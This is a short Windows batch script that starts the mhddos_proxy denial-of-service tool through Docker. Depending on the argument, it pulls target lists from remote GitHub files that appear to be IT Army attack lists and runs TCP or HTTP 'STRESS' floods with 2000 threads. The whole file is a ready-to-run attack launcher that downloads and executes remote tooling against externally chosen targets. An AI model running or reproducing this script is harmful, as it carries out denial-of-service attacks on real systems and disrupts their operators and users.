if [%1]==[] goto default
if [%1]==[tcp] goto tcp
if [%1]==[htcp] goto htcp
if [%1]==[http] goto direct
:default
start docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -c https://raw.githubusercontent.com/daniilmeranov/ITArmy_lsts/master/Haydamaky.lst -t 2000 --rpc 2000 --http-methods STRESS
goto end
:htcp
start docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -c https://raw.githubusercontent.com/daniilmeranov/ITArmy_lsts/master/Hay_tcp.lst -t 2000 --rpc 2000
goto end
:http
start docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -c https://raw.githubusercontent.com/daniilmeranov/ITArmy_lsts/master/ITA_http.lst -t 2000 --rpc 2000 --http-methods STRESS
goto end
:tcp
start docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -c https://raw.githubusercontent.com/daniilmeranov/ITArmy_lsts/master/ITA_tcp.lst -t 2000 --rpc 2000
goto end
:end
rem  -t 2000 --http-methods STRESS GET --rpc 1000
